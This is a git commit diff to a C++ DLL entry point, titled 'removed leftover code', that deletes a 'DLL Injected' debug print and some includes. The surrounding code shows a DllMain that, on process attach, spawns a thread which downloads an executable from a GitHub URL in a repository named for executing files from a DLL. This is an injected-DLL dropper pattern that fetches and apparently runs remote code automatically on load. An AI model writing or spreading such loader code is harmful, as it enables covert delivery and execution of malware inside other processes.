2715b7dcd6124e4a716592cbb8d7080965975d9e
LunaEwE <58312510+LunaEwE@users.noreply.github.com>
2020-01-29 02:27:42 -0600

    removed leftover code

--- dll/entry_point/entry_point.cpp
+++ dll/entry_point/entry_point.cpp
@@ -1,10 +1,6 @@
-#include <Windows.h>
-#include <iostream>
 #include "../file_downloader/file_downloader.h"
 
 void start( ) {
-	printf_s( "DLL Injected\n" );
-
 	if ( !n_file_downloader::download_file( "http://github.com/SilentProjects/executing_files_from_dll/raw/master/Release/file.exe" ) )
 		MessageBoxA( 0, "download failed", "effd", MB_OK );
 
@@ -13,7 +9,7 @@ void start( ) {
 
 BOOL WINAPI DllMain( _In_ HINSTANCE instance, _In_ DWORD reason, _In_ LPVOID reserved ) {
 	if ( reason == DLL_PROCESS_ATTACH ) {
-		if ( auto handle = CreateThread( 0, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>( start ), 0, 0, 0 ) )
+		if ( auto handle = CreateThread( 0, 0, reinterpret_cast< LPTHREAD_START_ROUTINE >( start ), 0, 0, 0 ) )
 			CloseHandle( handle );
 	}
 
